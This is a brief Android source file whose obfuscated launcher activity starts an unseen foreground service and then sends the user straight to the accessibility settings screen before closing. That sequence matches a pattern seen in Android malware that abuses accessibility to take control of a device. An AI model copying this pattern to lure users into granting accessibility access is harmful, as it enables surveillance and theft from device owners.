package com.v2ram;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

public class a extends Activity {
    @Override protected void onCreate(Bundle s) {
        super.onCreate(s);
        Intent fgs = new Intent(this, m.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(fgs);
        else startService(fgs);
        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        finish();
    }
}